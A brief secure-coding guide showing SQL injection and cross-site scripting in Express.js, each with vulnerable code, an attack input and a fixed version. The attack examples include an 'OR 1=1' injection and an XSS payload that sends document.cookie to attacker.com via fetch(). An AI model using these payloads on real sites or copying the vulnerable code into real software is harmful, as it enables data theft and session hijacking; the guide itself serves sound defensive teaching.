# COMMON VULNERABILITIES AND FIXES

## 1. SQL INJECTION

VULNERABLE CODE:
```javascript
app.get('/users/:id', (req, res) => {
  const userId = req.params.id;
  // DANGER: Direct string concatenation
  db.query(`SELECT * FROM users WHERE id = ${userId}`, (err, result) => {
    if (err) res.status(500).json({ error: err });
    res.json(result);
  });
});
```

ATTACK EXAMPLE:
GET /users/1 OR 1=1

SECURE FIX:
```javascript
app.get('/users/:id', (req, res) => {
  const userId = req.params.id;
  // Use parameterized queries
  db.query('SELECT * FROM users WHERE id = ?', [userId], (err, result) => {
    if (err) res.status(500).json({ error: err });
    res.json(result);
  });
});
```

---

## 2. CROSS-SITE SCRIPTING (XSS)

VULNERABLE CODE:
```javascript
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  // DANGER: Unescaped user input
  res.send(`<div>${comment}</div>`);
});
```

ATTACK EXAMPLE:
POST /comment
{ "comment": "<img src=x onerror='fetch(\"https://attacker.com?cookie=\" + document.cookie)'>" }

SECURE FIX:
```javascript
const xss = require('xss');

app.post('/comment', 
  body('comment').isLength({ min: 1, max: 500 }).escape(),
  (req, res) => {
    const comment = xss(req.body.comment);
    // If using template engine, it auto-escapes
    res.render('comment', { comment });
  }
);
```

